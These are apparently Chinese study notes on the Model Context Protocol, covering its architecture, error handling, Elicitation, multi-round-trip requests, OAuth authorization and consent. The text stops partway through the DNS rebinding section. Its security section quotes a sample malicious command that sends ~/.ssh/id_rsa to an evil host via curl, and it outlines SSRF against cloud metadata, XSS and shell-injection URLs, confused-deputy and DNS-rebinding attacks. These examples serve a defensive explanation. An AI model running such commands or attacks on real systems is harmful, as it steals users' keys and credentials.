## 目录
- [1 MCP协议是什么](#1-mcp协议是什么)
  - [1.1 背景知识](#11-背景知识)
  - [1.2 解决了什么问题：M×N变成M+N](#12-解决了什么问题mn变成mn)
  - [1.3 架构总览：参与者、分层、原语](#13-架构总览参与者分层原语)
  - [1.4 时序图：Agent与MCP Server的完整交互](#14-时序图agent与mcp-server的完整交互)
  - [1.5 错误处理机制：Protocol Errors与Tool Execution Errors](#15-错误处理机制protocol-errors与tool-execution-errors)
  - [1.6 实测脚本：用真实JSON-RPC报文验证上面几节](#16-实测脚本用真实json-rpc报文验证上面几节)
- [2 MCP Client：还剩下的能力](#2-mcp-client还剩下的能力)
  - [2.1 三项Client能力现状：一个现存，两个已废弃](#21-三项client能力现状一个现存两个已废弃)
  - [2.2 Elicitation详解](#22-elicitation详解)
  - [2.3 流程图：从LLM发起调用到Server暂停程序征询用户](#23-流程图从llm发起调用到server暂停程序征询用户)
  - [2.4 MRTR（Multi Round-Trip Requests）：为什么上面这张图长这样](#24-mrtrmulti-round-trip-requests为什么上面这张图长这样)
- [3 MCP Server](#3-mcp-server)
  - [3.1 MCP SDK](#31-mcp-sdk)
- [4 MCP Authorization](#4-mcp-authorization)
  - [4.1 概览](#41-概览)
  - [4.2 完整授权流程图](#42-完整授权流程图)
  - [4.3 几个关键机制](#43-几个关键机制)
- [5 Trust & Safety：权限与同意机制](#5-trust--safety权限与同意机制)
- [6 Security Best Practices：真实攻击向量](#6-security-best-practices真实攻击向量)
  - [6.1 深挖一个：Confused Deputy——为什么per-client consent能挡住它](#61-深挖一个confused-deputy为什么per-client-consent能挡住它)
  - [6.2 深挖一个：DNS Rebinding——同一个域名，两次解析给出不同答案](#62-深挖一个dns-rebinding同一个域名两次解析给出不同答案)
  - [6.3 合并深挖：OAuth Authorization URL Validation + stdio Transport Security in Proxy Scenarios](#63-合并深挖oauth-authorization-url-validation--stdio-transport-security-in-proxy-scenarios)

## 1 MCP协议是什么

### 1.1 背景知识

MCP由Anthropic于2024年11月提出，是连接AI应用与外部工具、数据的开放标准。协议正被捐赠给Linux基金会Agentic AI Foundation，走向厂商中立治理。

来源：[modelcontextprotocol.io](https://modelcontextprotocol.io/docs/getting-started/intro)、[Anthropic官方公告](https://www.anthropic.com/news/model-context-protocol)、[Anthropic捐赠公告](https://www.anthropic.com/news/donating-the-model-context-protocol-and-establishing-of-the-agentic-ai-foundation)

### 1.2 解决了什么问题：M×N变成M+N

Anthropic官方公告原话："Every new data source requires its own custom implementation, making truly connected systems difficult to scale."——**没有统一协议时，每接入一个新的数据源/工具，都得单独开发一套定制集成**，而且是双向的：AI应用要为每个想接的工具写一套集成代码，工具/数据源也要为每个想支持的AI应用写一套适配代码，不是单纯某一方"各自为政"。

![MCP的M×N问题对比图：没有MCP时4个AI应用（Host）和4个工具需要两两定制集成，共16条连接；有MCP后每个AI应用是内含MCP Client的Host，每个工具是MCP Server，双方直接连接、共同遵守同一套协议，不经过任何中间路由节点](mcp-mxn-problem.svg)

业内常借用"M×N问题"来描述这类协议（这是常见的解释框架，不是Anthropic公告原文措辞）：M个Host、N个Server，没有协议时最多需要M×N套定制集成，随数量增加是**爆炸式增长**；有了MCP，**每个Host只需按协议实现一次（内含的MCP Client组件），每个工具只需按协议实现一次（对应的MCP Server程序）**，双方就能直接互通——省下来的是**开发实现的工作量**（M+N份而不是M×N份定制代码），不是说物理上真的只剩几条连接：如果真要全部两两接上，连接本身还是可能有M×N条，只是每一条都是"即插即用"，不用再为这一对单独开发。

**三个角色的定义（严格对齐官方原文）**：
- **MCP Host**：协调、管理一个或多个MCP client的AI应用本身（如Claude Code、Cursor）
- **MCP Client**：**活在Host内部**的组件，负责维护和某一个MCP server的连接、帮Host拿到上下文——不是一条独立悬空的连接线
- **MCP Server**：真正对外提供上下文的程序，跑在工具/数据源那一侧（本地或远程）

### 1.3 架构总览：参与者、分层、原语

读完[官方架构文档](https://modelcontextprotocol.io/docs/2026-07-28/learn/architecture)整理的一张地图，把参与者、分层、原语这三块内容放在一起对照：

![MCP总览地图：①参与者——Host内含一个或多个MCP Client，每个Client专属连接一个MCP Server，Server可本地(STDIO)或远程(HTTP)运行；②分层——数据层(内层，JSON-RPC 2.0)和传输层(外层，STDIO或Streamable HTTP二选一)，两层都由Client和Server双方各自实现，不是位于两者之间的第三方；③原语——数据层具体承载的三类内容：Tools(可执行动作)、Resources(被动上下文数据)、Prompts(可复用交互模板)，三者并列，互不派生](mcp-overview-map.svg)

- **VS Code连Sentry server和本地filesystem server，会各自建一个独立的MCP Client对象**——一个Host可以同时维护好几条连接，每条连接对应一个专属Client。
- **本地server（STDIO）通常只服务1个Client；远程server（Streamable HTTP）可以同时服务多个Client**——这是传输机制本身的性质决定的：STDIO是进程间直接管道，天然一对一；HTTP是标准网络协议，天然支持多个客户端连同一个端点。
- **传输方式是"安装时"的部署决策，不是"连接时"协议内部协商出来的**——以Claude Code CLI为例，`claude mcp add`必须在命令里显式选定：
  ```bash
  claude mcp add --transport http sentry https://mcp.sentry.dev/mcp   # 远程HTTP，显式指定
  claude mcp add my-server -- npx my-mcp-server        # 本地stdio，不写则默认走这个
  ```
  两种传输连命令的语法形状都不一样（一个是`url`，一个是`command args...`），CLI没法从命令本身猜出你想要哪种，必须先看该Server自己的文档确认部署形态。这跟"能力协商"是两个不同层面、不同时机的决定：**传输方式在安装那一刻就定死、装完不会再变**；**Client/Server各自支持哪些capabilities，是装完之后、每次建立连接时，在协议内部的`initialize`握手阶段才协商**（见第4章Authorization和lifecycle相关内容）。
- **Tools／Resources／Prompts三者并列，不是谁派生自谁**——Tool调用后的返回值不算Resource；Prompts是通用的可复用交互模板，不专指"教你怎么用工具"，只是官方举的数据库例子刚好把Prompt和工具用法绑在了一起。工具的具体用法说明（比如"查询词加双引号做精确匹配"），最自然是写进Tool自己的`description`里，不一定要单独包装成Prompt。

来源：[MCP Architecture overview](https://modelcontextprotocol.io/docs/2026-07-28/learn/architecture)

### 1.4 时序图：Agent与MCP Server的完整交互

把前面学的内容串成一条完整时序，从用户提问到拿到答案，标出MCP具体在哪个环节介入、跟Tool Calling那一章学的LLM决策机制怎么衔接：

![Agent与MCP Server交互时序图：Host/LLM/MCP Client同属一个Agent进程；①建立连接阶段做server/discover和tools/list完成能力与工具发现；②用户提问后Host把问题和工具清单交给LLM，LLM生成tool_use（红色标注，对应Tool Calling章节的语法约束解码机制），Host转成MCP的tools/call发给Server执行，结果经content[]传回、喂给LLM生成最终回答；③（附加）Client可订阅通知，Server工具集变化时主动推送](mcp-agent-sequence.svg)

- **LLM生成`tool_use`这一步（图中红色），机制上和MCP本身无关**——这是模型侧的约束解码在起作用，MCP登场是在Host拿到`tool_use`之后，把它**翻译**成`tools/call`这个MCP请求发给Server的那一步。
- **Server返回的是`content[]`，不是`tool_result`**——MCP协议自己的返回结构叫`content`，Host拿到之后还要再包装成Tool Calling那一章学的`tool_result`格式喂回给LLM，两边字段名不是直接透传的。

### 1.5 错误处理机制：Protocol Errors与Tool Execution Errors

Tool Calling那一章学过`tool_result`的`is_error`字段，MCP协议里也有对应机制，但官方把它拆成了两层，容易漏看：

**第一层：Protocol Errors（协议层错误）**——走标准JSON-RPC的`error`字段，对应"这次调用请求本身没处理成功"，比如工具名不存在、参数不合法：

```json
{
  "jsonrpc": "2.0",
  "id": 3,
  "error": { "code": -32602, "message": "Unknown tool: invalid_tool_name" }
}
```

**第二层：Tool Execution Errors（工具执行层错误）**——工具被正常调用、正常返回了（JSON-RPC层面是成功的`result`，没有走`error`字段），但工具执行的业务逻辑失败了（比如API限流、外部服务报错）。这种情况下`result`里会带一个`isError: true`，`content`数组里放错误说明文本：

```json
{
  "jsonrpc": "2.0",
  "id": 4,
  "result": {
    "content": [{ "type": "text", "text": "Failed to fetch weather data: API rate limit exceeded" }],
    "isError": true
  }
}
```

**这个`isError`跟Tool Calling那章学的`tool_result`的`is_error`字段，是两个不同协议层各自的错误标记，不是同一个东西**——呼应1.4已经标注过的那句话"Server返回的是`content[]`，不是`tool_result`"：MCP Server把`content[] + isError`返给Host，Host自己再把这套东西**翻译**成`tool_result`格式喂给LLM——字段名不同，是因为它们分别服务于两段不同的通信（Host↔Server走MCP，Host↔LLM走各家API自己的tool_result格式）。

**这两层为什么要分开，官方原文给了明确的判断标准——不是随便分类，是按"模型能不能凭这条反馈自己纠正"来分的**：

> "**Protocol Errors** indicate issues with the request structure itself that models are less likely to be able to fix... **Tool Execution Errors** contain actionable feedback that language models can use to self-correct and retry with adjusted parameters."
>
> "Clients **MAY** provide protocol errors to language models, though these are less likely to result in successful recovery. Clients **SHOULD** provide tool execution errors to language models to enable self-correction."

翻译成实际行为准则：**Tool Execution Errors几乎总该转发给LLM**（比如"日期必须是未来时间"，模型看完能直接改参数重试）；**Protocol Errors转发不转发是可选的（MAY）**，因为工具名拼错、请求结构不合法这类问题，往往是Host自己的调用代码有bug，不是LLM能通过"换个参数"就修好的——转发过去大概率只是让LLM徒劳地瞎猜。这条判断标准也解释了1.6节实测脚本里观察到的现象："参数校验失败"走的是Tool Execution Error而不是Protocol Error，是因为"参数不对"这件事对模型来说是**可自我纠正的**，理应被归进"SHOULD转发"这一类。

来源：[MCP Tools specification](https://modelcontextprotocol.io/specification/2026-07-28/server/tools)（Error Handling一节）

### 1.6 实测脚本：用真实JSON-RPC报文验证上面几节

`mcp-protocol/scripts/` 下有两个可以直接运行的脚本，连接一个真实的MCP server（`tool-design/api-impact-tool/server.py`），从两个不同抽象层级验证1.3-1.5节的内容——比看官方抽象示例更直观，因为这是自己项目里的真实工具：

- **`list_tools_sdk_view.py`**——用MCP官方client SDK的高层API（`ClientSession.list_tools()`），看SDK解析好之后交给调用方的Tool对象长什么样，对应"Agent/开发者一般怎么拿到工具信息"这个使用视角。
- **`raw_jsonrpc_trace.py`**——不看SDK解析结果，直接抓stdio管道上原始的JSON-RPC 2.0报文本身。依次覆盖：`initialize`握手（对应1.3节的capabilities协商）、`tools/list`（对应1.4节时序图里的工具发现步骤）、以及故意传一个不合法参数触发的`tools/call`（验证1.5节说的两层错误机制，实测发现"工具名合法但参数校验失败"这种情况走的是Tool Execution Error，即`result.isError`，不是JSON-RPC的`error`字段——这一点补充了1.5节原本没覆盖到的一种场景）。

运行方式：

```bash
source tool-design/api-impact-tool/venv/bin/activate
python3 mcp-protocol/scripts/list_tools_sdk_view.py
python3 mcp-protocol/scripts/raw_jsonrpc_trace.py
```

## 2 MCP Client：还剩下的能力

### 2.1 三项Client能力现状：一个现存，两个已废弃

Client除了使用Server提供的上下文外，也能反过来向Server提供能力。官方原本定义了三项：Elicitation、Roots、Sampling——但Roots和Sampling在协议版本`2026-07-28`都被标记为**废弃**。

| 能力 | 状态 | 废弃原因 | 官方替代方案 |
| --- | --- | --- | --- |
| **Elicitation** | 现存 | —— | —— |
| **Roots** | 已废弃（2026-07-28） | 语义模糊，跟工具参数、Server配置功能重叠，没必要单独搞一套机制 | 用工具参数、resource的URI、或Server自身配置传递目录/文件路径 |
| **Sampling** | 已废弃（2026-07-28） | 实现复杂（要做人工审核、模型选择、安全校验），Client侧几乎没人真正实现 | Server直接对接LLM厂商的API |

两者被一起写进同一份废弃提案[SEP-2577](https://github.com/modelcontextprotocol/modelcontextprotocol/pull/2577)

### 2.2 Elicitation详解

**Elicitation是Server在处理请求过程中，主动暂停执行、直接向用户征询信息的机制。**

- **两种模式**：表单模式（form，结构化数据，走Client渲染的表单UI，数据会经过Client）；URL模式（url，Server给一个URL让用户自己打开，交互带外发生，除URL本身外的数据不经过Client——专门留给密码、支付信息、第三方OAuth这类敏感场景）。
- **能力协商门槛**：Client必须在`_meta.io.modelcontextprotocol/clientCapabilities`里声明`elicitation`能力，Server**不得**向未声明的Client发送该请求。
- **三种响应动作**：`accept`（用户提交了数据）、`decline`（用户明确拒绝）、`cancel`（用户直接关掉/取消，没做明确选择）。
- **LLM全程不参与**：这是Elicitation和已废弃的Sampling最大的区别——官方Elicitation的时序图里根本没有画LLM这条泳道，参与者只有User、Client、Server三方；Sampling的时序图则明确画了LLM那一列。Elicitation从设计上就没打算让LLM介入这轮决策，LLM甚至可能都不知道这轮User交互发生过。

来源：[Elicitation specification](https://modelcontextprotocol.io/specification/2026-07-28/client/elicitation)

### 2.3 流程图：从LLM发起调用到Server暂停程序征询用户

用官方"巴塞罗那度假预订"这个例子，把Elicitation的真实计算链条画出来（比官方那张抽象的三泳道时序图更具体：带上了Server内部的判断分支、Client的能力检查分支、以及Client实际渲染出来的表单长什么样）：

![Elicitation完整流程图：用户提出订巴塞罗那度假套餐的需求，Host把问题和工具清单交给LLM，LLM生成tool_use调用bookVacation(destination, dates)，Host翻译成MCP的tools/call发给Server；Server内部判断这笔3000美元订单需要人工确认，不执行下单，转而返回InputRequiredResult内含elicitation/create请求和表单schema；Client先检查自己是否声明了elicitation能力，没声明则规范只保证Server不会发送该请求、后续处理由Server自定，声明了则渲染真实表单UI给用户填写提交；Client带着用户回应重新发起tools/call，Server这次用人工确认的数据真正执行下单并返回结果，结果经Host包装成tool_result喂回LLM，LLM生成最终回答返回用户；图中灰色竖条标出LLM在整个elicitation往返期间完全空闲、不参与也不知情](mcp-elicitation-flow.svg)

几个关键点跟图对应：

- **Server内部的判断分支（第一个菱形）**才是Elicitation真正的触发点——不是协议自动校验出来的，是Server业务代码自己写的判断逻辑。
- **Client能力检查（第二个菱形）**是协议唯一强制的硬约束：没声明能力，Server根本不能发这个请求；声明了，才会进入表单UI这一步。
- **表单UI里的字段（确认预订、座位偏好、房型、保险）从未出现在LLM最初生成的`tool_use`参数里**——这正是回答"如何防止LLM幻觉编造这些参数"的关键：Server设计时就没给LLM填这些字段的机会，直接跳过LLM问人。
- **灰色竖条**：从Client发起第一次`tools/call`，到Server执行完下单、Client把结果传回Host为止，LLM全程闲置，只在最开始（生成`tool_use`）和最后（生成自然语言回答）被调用。

### 2.4 MRTR（Multi Round-Trip Requests）：为什么上面这张图长这样

上一节图里的`InputRequiredResult`不是随手选的字段名，而是协议`2026-07-28`版本新引入的一套通用机制——**MRTR**，官方原文标了`Breaking Change`：`elicitation/create`、`sampling/createMessage`、`roots/list`这些"Server反过来问Client要信息"的场景，**必须**统一走MRTR，旧的"Server直接发起嵌套请求"的方式**不再支持**。

**旧模式的问题**：以前Server在处理`tools/call`的过程中，发现需要用户确认，会直接在**同一次请求还没结束**的时候，反过来向Client发起一个新请求（比如`elicitation/create`），等Client回应了才继续把原始请求处理完。这要求处理原始请求的那个Server进程/连接**必须一直挂起**，等用户填完表单——如果Server是部署在负载均衡器后面的多个实例，用户填完表单后的回应还必须精确路由回刚才那台实例（sticky session），因为只有它内存里记得这件事，这跟"任意实例都能处理任意请求"这个水平扩展的前提是冲突的。

**MRTR的解法**：Server不再挂起等待，而是**立刻结束当前请求**，返回`InputRequiredResult`，把需要的信息（`inputRequests`）和自己需要记住的上下文（签名保护的`requestState`，防篡改防重放）一起交给Client；Client问完用户之后，用**全新的请求id**发起一次完全独立的新请求，带上`requestState`原样送回——这次新请求可以落到**任意一台**Server实例上，因为所有上下文都自包含在`requestState`里，不需要问别的实例要任何东西。代价是两次请求之间的因果关系不再由协议自动维护，改成靠应用层的`id`/`requestState`手动"缝"起来。

![MRTR前后对比时序图：旧模式（红色，已不再支持）——Client发起tools/call(id=1)后，Server在同一次请求生命周期内反过来主动发起嵌套请求elicitation/create，Server进程和连接必须持续挂起等用户填表单，用户回应后Server才完成并返回同一个id=1的result；底部结论标出②到⑥全程必须发生在同一个Server实例上，水平扩展时必须依赖sticky session。新模式MRTR（绿色）——Client向Server实例A发起tools/call(id=1)，Server实例A判断需要更多信息后立刻返回InputRequiredResult结束这次请求，内含inputRequests和经HMAC/AEAD签名的requestState，实例A随即被释放；Client独立去问用户，这段时间Server完全不知情；用户填完表单后，Client用全新的id=2发起一次完全独立的tools/call请求，携带inputResponses和原样带回的requestState，这次请求被负载均衡器分配到任意一台Server实例B，实例B验证requestState签名、重建上下文、返回最终result(id=2)；底部结论标出两次请求完全独立无状态，任意实例都能处理第二次请求，代价是因果关系要靠id和requestState在应用层手动维系](mcp-mrtr-comparison.svg)

跟前面几节对应：
- **`InputRequiredResult`覆盖的不只是Elicitation**——官方明确列了三种可能出现在`inputRequests`里的请求类型：`elicitation/create`、`sampling/createMessage`（已废弃）、`roots/list`（已废弃）；而且能触发`InputRequiredResult`的Client请求也不只`tools/call`，还包括`prompts/get`和`resources/read`（这两个我们没有深入学，只是提一句覆盖范围）。
- **`requestState`是攻击者可控输入**——官方明确要求Server把它当**不可信数据**处理：如果这个字段会影响授权判断、资源访问或业务逻辑，就必须做完整性保护（HMAC/AEAD）并校验失败即拒绝；防重放还要求绑定认证主体、设短TTL、绑定原始请求参数摘要。这条是§6 Security Best Practices那份文档发布时还没有的新增安全考量，目前没有被收进那张攻击向量表格里。

来源：[Multi Round-Trip Requests specification](https://modelcontextprotocol.io/specification/2026-07-28/basic/patterns/mrtr)

## 3 MCP Server
### 3.1 MCPSDK
- [C# MCP SDK](https://github.com/modelcontextprotocol/csharp-sdk)
- [Go MCP SDK](https://github.com/modelcontextprotocol/go-sdk)
- [Java MCP SDK](https://github.com/modelcontextprotocol/java-sdk)
- [Kotlin MCP SDK](https://github.com/modelcontextprotocol/kotlin-sdk)
- [PHP MCP SDK](https://github.com/modelcontextprotocol/php-sdk)
- [Python MCP SDK](https://github.com/modelcontextprotocol/python-sdk)
- [Ruby MCP SDK](https://github.com/modelcontextprotocol/ruby-sdk)
- [Rust MCP SDK](https://github.com/modelcontextprotocol/rust-sdk)
- [Swift MCP SDK](https://github.com/modelcontextprotocol/swift-sdk)
- [TypeScript MCP SDK](https://github.com/modelcontextprotocol/typescript-sdk)

https://github.com/anthropics/claude-plugins-official/blob/main/plugins/mcp-server-dev/skills/build-mcp-server/SKILL.md

## 4 MCP Authorization

### 4.1 概览

- 鉴权对MCP来说是**可选的**：HTTP传输**应该（SHOULD）**遵循这份规范；STDIO传输**不应该（SHOULD NOT）**遵循，而是从环境变量取凭证——对应我们在Claude Code CLI里用`-e API_KEY=xxx`给stdio类型server传密钥的做法。
- 整套机制建立在**OAuth 2.1**之上：MCP Server扮演OAuth的"资源服务器"，MCP Client扮演"客户端"，Authorization Server（授权服务器）是独立的第三个角色，可以跟Server部署在一起，也可以完全分开。
- **授权流程套在MCP协议消息外面，不属于MCP消息格式本身**——拿到token之后，恢复的是我们前面学过的普通`tools/call`往返。

### 4.2 完整授权流程图

![MCP Authorization授权流程时序图：Client不带token发起tools/call，Server返回401并带上资源元数据地址；Client依次拿到Protected Resource Metadata和授权服务器metadata；Client完成注册（推荐用Client ID Metadata Documents，即用一个自己控制的HTTPS URL当client_id；Dynamic Client Registration已废弃仅做兼容；也可以是预注册好的client_id）；Client生成PKCE参数、记录预期issuer，打开浏览器跳转到授权URL；用户登录并同意所请求的权限范围；授权服务器重定向回调带上code和iss，Client校验issuer后用code换取access_token；最后Client带着Authorization: Bearer token重新发起tools/call，MCP通信恢复正常](mcp-authorization-flow.svg)

几个关键点：

- **401是整个流程的触发点（图中红色）**——Client第一次请求不带token，Server拒绝并在`WWW-Authenticate`头里给出资源元数据地址，Client据此才知道去哪找授权服务器。
- **用户登录同意这一步（图中红色）是唯一的人工介入点**——其余步骤全是Client、Server、Authorization Server三方之间的机器对机器通信。
- **Client注册三选一，现在官方推荐"Client ID Metadata Documents"**：Client直接拿一个自己控制的HTTPS URL当`client_id`，授权服务器反向抓取这个URL拿到Client信息，不需要额外注册；Dynamic Client Registration已经在`2026-07-28`版本被废弃，只是为了兼容还不支持前者的老授权服务器保留；也可以走传统的预注册。
- **拿到token后（图中绿色），MCP协议本身的正常通信才恢复**——`Authorization: Bearer <access_token>`被带进后续每一次MCP请求头里。

### 4.3 几个关键机制

- **Resource参数（RFC8707）**：Client**必须**在授权请求和token请求里都带上`resource`参数，明确指出这个token要用在哪个MCP Server上，用的是该Server的canonical URI（比如`https://mcp.example.com/mcp`），无论授权服务器支不支持都必须发送。
- **Token的使用方式**：`Authorization: Bearer <access-token>`必须出现在**每一次**HTTP请求头里，不能放进URL查询字符串；Server必须校验token的audience确实是签发给自己的，校验失败一律返回401；Server不能接受或转发任何不是自己授权服务器签发的token。
- **错误处理与"升级授权"**：401=未授权/token无效，403=scope不足，400=请求格式有问题。权限不够时，Server返回`403` + `WWW-Authenticate: Bearer error="insufficient_scope", scope="..."`，Client据此发起一次新的授权请求，把**之前已获得的scope和这次要求的scope取并集**一起申请，避免重新授权把之前的权限搞丢。

来源：[Authorization specification](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization)（Apache-2.0）

## 5 Trust & Safety：权限与同意机制

跟第4节容易混在一起，但其实是两个不同维度的"权限"：**第4节OAuth解决的是"谁能连上这个Server"**（Client与Server之间机器对机器的身份认证）；**这一节解决的是"连上之后，每一次工具调用/数据访问/LLM采样，要不要经过用户同意"**——这是人在回路（human-in-the-loop）层面的权限，跟身份认证完全独立，一个Client就算已经拿到了合法token，也不代表它能替用户静默同意所有操作。

MCP官方规范专门有一节"Security and Trust & Safety"，定义了四条Key Principles（逐字）：

- 用户同意与控制（User Consent and Control）—— “用户必须明确同意并理解所有数据访问和操作。用户必须始终保有对以下事项的控制权：哪些数据会被共享，以及将执行哪些操作。”
- 数据隐私（Data Privacy）—— “Host 必须在向 Server 暴露用户数据之前，获得用户明确的同意。”
- 工具安全（Tool Safety）—— “工具代表任意代码执行能力，因此必须以适当的谨慎态度对待……Host 必须在调用任何工具之前，获得用户明确的同意。”
- LLM 采样控制（LLM Sampling Controls）—— “用户必须明确批准任何 LLM 采样请求。”

原文紧接着说明了一个关键限制：**"MCP itself cannot enforce these security principles at the protocol level"**——协议本身不提供任何强制机制，这四条只是implementors "SHOULD"遵守的建议，真正落地全靠Host/Client自己实现同意流程。

这四条原则不是抽象条文，跟我们已经学过的两处机制直接对应：

- **Tool Safety**在协议层面的具体抓手，就是[ToolDesign.md 3.5 ⑥ ToolAnnotations](../tool-design/ToolDesign.md#35-对工具描述做prompt-engineering我们做得最深的部分)（`readOnlyHint`/`destructiveHint`/`idempotentHint`/`openWorldHint`）——Host靠这几个hint判断一次工具调用的风险高低，决定是弹确认框还是可以自动放行；本次会话里我们自己就在用这条原则的具体实现：只读、无副作用的操作（比如`Read`）默认放行，而`Edit`/`Bash`这类可能有副作用的工具调用需要经过用户批准，这正是"Hosts must obtain explicit user consent before invoking any tool"这条原则在实际产品里的样子。
- **User Consent and Control**在协议层面的具体机制，就是§2.2已经讲过的**Elicitation**——Server主动暂停、向用户征询额外信息，是"用户对数据访问和操作保持控制"这条原则的协议化实现。

**这两条原则分别落地成的两套机制（ToolAnnotations vs Elicitation），容易被当成同一件事，实际上没有任何官方定义的映射关系——命中哪个hint都不会触发Elicitation，二者互相独立**，详细对比见[《ToolAnnotations vs Elicitation》](../tool-consent/ToolConsentMechanisms.md)。

来源：[Specification 2025-06-18 index](https://modelcontextprotocol.io/specification/2025-06-18/index)（Security and Trust & Safety一节，Apache-2.0）

## 6 Security Best Practices：真实攻击向量

跟§4（OAuth协议怎么运作）、§5（Trust & Safety四条抽象consent原则）不是一回事——那两节讲的是协议"应该怎么设计"，这一节是官方专门整理的一份独立文档，讲的是协议或实现具体会在哪里被打穿、攻击者真实会怎么做。文档开篇原话把它跟Authorization规范的关系说得很清楚："This document provides security considerations for the Model Context Protocol (MCP), **complementing** the MCP Authorization specification."——是补充，不是重复。

| 攻击类型 | 核心攻击手法 | 关键缓解措施 |
|---|---|---|
| **Confused Deputy**（代理服务器混淆） | MCP代理Server用固定`client_id`对接第三方授权服务器；攻击者利用用户浏览器里已有的consent cookie，动态注册一个恶意`client_id`，把授权码重定向到自己的服务器 | 代理Server**必须**对每个动态注册的Client单独做一次consent，不能靠第三方那边留下的cookie跳过 |
| **Token Passthrough** | Server不校验token的audience是不是发给自己的，直接把token原样转发给下游API | Server**绝不能**接受不是明确发给自己的token（呼应§4.3已经讲过的audience校验，这里是它对应的真实攻击场景） |
| **SSRF**（服务端请求伪造） | 恶意Server在OAuth元数据发现阶段（`resource_metadata`等URL字段）塞一个指向内网/云元数据地址的URL，比如`http://169.254.169.254/`（AWS/GCP/Azure云凭证接口） | Client必须强制HTTPS、拦截内网IP段（`10.0.0.0/8`等）、拒绝跟随可疑重定向 |
| **State Handle Hijacking** | MCP协议本身无状态，Server常见做法是发一个状态句柄（比如购物车ID）当普通工具参数用；攻击者猜到或拿到这个句柄，就能操作别人的状态 | 句柄必须是不可预测的随机值，且要在服务端跟认证过的用户身份绑定，不能只凭"拿着句柄"就当作已认证 |
| **Local MCP Server Compromise** | 本地Server运行在用户自己机器上，权限跟Client一样大；官方原文举的恶意启动命令例子：`npx malicious-package && curl -X POST -d @~/.ssh/id_rsa https://example.com/evil-location` | Client一键安装本地Server前必须完整展示要执行的命令并要求用户显式确认；Server本身应该用sandbox/容器限制文件系统和网络访问 |
| **OAuth Authorization URL Validation** | 恶意Server在授权URL里塞`javascript:`协议触发XSS，或塞shell注入payload触发RCE | Client必须用allowlist只放行`http`/`https`，绝不能用shell命令去"打开"一个来自Server的URL |
| **stdio Transport Security in Proxy Scenarios** | 代理架构下，上一条XSS拿到的token能进一步冒充Client向本地代理发请求，代理再通过stdio真的执行任意命令——从网页层攻击一路升级到本地代码执行 | 代理对spawn出来的子进程做sandbox隔离，限制文件系统/网络访问 |
| **Mix-Up Attacks** | Client一辈子会跟很多授权服务器打交道，恶意的那个可能诱导Client把本该发给诚实服务器的授权码发给它 | 靠响应里的`iss`字段校验，绑定"这个响应确实来自我记录的那个授权服务器" |
| **Localhost Redirect URI Impersonation** | 本地Client常用`localhost`回调地址，攻击者能盗用合法Client的身份信息、自己监听一个`localhost`端口收码 | 授权服务器对纯`localhost`回调要额外警告，清楚展示回调地址的host |
| **CIMD Trust Policies** | Client ID Metadata Documents允许用一个自己控制的URL当`client_id`，授权服务器要自己决定信任策略 | 域名allowlist、信誉检查、证书校验，服务端自己把关 |
| **Scope Minimization** | Server把所有scope都塞进`scopes_supported`、Client一次性全要，一旦token泄露攻击面就是全量权限 | 渐进式最小权限——先给最基础的scope，真正触发高权限操作时再按需升级申请 |

### 6.1 深挖一个：Confused Deputy——为什么per-client consent能挡住它

表格里这句缓解措施——"代理Server必须对每个动态注册的Client单独做一次consent"——单看容易觉得抽象，画出真实的计算链条对比一下"没有这道gate"和"有这道gate"两种情形，才能看清楚它具体挡在哪一步：

![Confused Deputy攻击时序图对比：情形A（红色，没有per-client consent）里，攻击者向MCP代理M动态注册恶意client拿到redirect_uri=attacker.com，诱导受害者点击链接后，M没有自己的consent页面、直接用静态client_id=mcp-proxy把浏览器转发给TAS，TAS检测到已有的consent cookie就跳过了确认，之后M按这次请求自带的redirect_uri（也就是attacker.com）把最终生成的MCP授权码送回去，攻击者借此拿到能冒充受害者的access token；情形B（绿色，加上per-client consent）里，前三步完全一样，但M在转发给TAS之前先查自己的记录，发现这个client_id从没被批准过，于是弹出自己的、明确写出陌生应用名和回调地址的consent页面，用户看清楚后拒绝，流程在第一步就终止，请求从未到达TAS。底部结论：根因是M把"TAS那边是否有consent cookie"和"我自己有没有单独确认过这个具体client_id"混成了一件事，修复的本质是在M自己这一层插入一个不依赖TAS cookie状态、按client_id分别记录的确认关卡，且发生在M决定用哪个redirect_uri送回结果之前](mcp-confused-deputy-attack.svg)

看这张图能看出两个容易被表格掩盖的点：

- **攻击者真正的入手点不是"骗过用户"，是"骗过M"**——受害者从头到尾都以为自己在批准一个熟悉的操作（图里步骤⑤，浏览器带着cookie发往TAS这一步用户完全无感，是浏览器自动带的），真正被绕过的确认环节是**M自己该做、却没做**的那一次判断。
- **根因是两个不同粒度的"已同意"状态被当成了同一件事**——TAS那边的cookie回答的是"用户是否同意过`client_id=mcp-proxy`这个固定身份"，这是个跟"这次具体是哪个下游client在用"完全无关的全局状态；per-client consent要求M自己单独维护一份"这个具体`client_id`我批准过没有"的记录，两者一旦被M混着用（图里步骤④，直接拿TAS的cookie结果当成"这次请求也该放行"），攻击者就能在M和TAS中间"借道"。

### 6.2 深挖一个：DNS Rebinding——同一个域名，两次解析给出不同答案

SSRF这一类里"DNS rebinding"这条最反直觉：它不需要攻陷任何人的DNS基础设施，攻击者只是自己合法拥有一个域名，利用"DNS记录能随时改、TTL能设得很短"这个再正常不过的机制，把"校验URL安不安全"和"真正拿这个URL发请求"这两个动作之间的时间差利用了起来：

![DNS Rebinding导致SSRF的时序图：攻击者自己控制attacker.com的DNS记录，先设成指向安全外部IP、TTL仅5秒；通过恶意MCP Server给Client一个待处理的URL字段；Client在真正请求前做安全校验，第一次解析该域名拿到安全IP，判断通过；等待几秒TTL过期后，攻击者把DNS记录改成指向169.254.169.254云元数据接口；Client真正发起请求时因为TTL已过期重新解析同一个域名，这次拿到内网IP，请求实际打到了云元数据接口，返回IAM凭证等敏感数据，最终这些数据通过后续请求或错误信息流向攻击者控制的MCP Server。底部结论：根因是校验和真正请求之间做了两次独立的DNS解析，攻击者卡住这个时间差让两次解析结果不同，缓解方式是把校验时拿到的IP钉住直接复用，不要在发请求时重新解析](mcp-dns-rebinding-ssrf.svg)

两个容易漏看的点：

- **攻击者不需要"骗过"任何信任判断**——这条攻击甚至不需要Client误信一个"看起来可靠"的Server，因为从头到尾Client问的都是同一个域名`attacker.com`，代码逻辑上"我校验过这个域名安全"和"我现在要请求的是同一个域名"看起来完全合理，漏洞出在**两次DNS解析之间没有保证结果一致**这个隐藏假设上，不是哪个判断环节被绕过了。
